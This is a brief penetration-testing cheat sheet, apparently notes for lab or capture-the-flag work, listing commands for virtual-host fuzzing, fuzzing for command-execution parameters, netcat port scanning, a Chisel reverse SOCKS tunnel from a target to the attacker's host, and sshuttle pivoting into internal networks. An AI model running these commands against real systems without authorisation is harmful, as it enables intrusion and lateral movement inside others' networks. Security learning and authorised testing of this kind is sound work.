# Vhost discovery:

- **Gobuster:**
```bash
gobuster vhost -u <URL to fuzz> -w <wordlist>
```
- **WFUZZ**
```bash
wfuzz -u <URL> -w <wordlist> -H "Host: FUZZ.example.com" --hc <status codes to hide>
```

# FUZZ RCE Parameters
```bash
wfuzz -u <http://example.com/?FUZZ=ls+-la> -w <wordlist> --hw 2
```
# Port Scanning with NetCat

```bash
nc -zv <IP> 1-65535
```
# Chisel (Reverse Connection):
> Make sure to add `socks5	127.0.0.1 1080` in **/etc/proxychains4.conf** file.
- On the local machine:
```bash
./chisel server -p 8000 --reverse
```
- On target host:
```bash
./chisel client <LHOST>:8000 R:socks
```
# Internal Network access using SShuttle:
```bash
└─$ sudo sshuttle -r <username>@<RHOST> <Internal IP/Subnet>
```
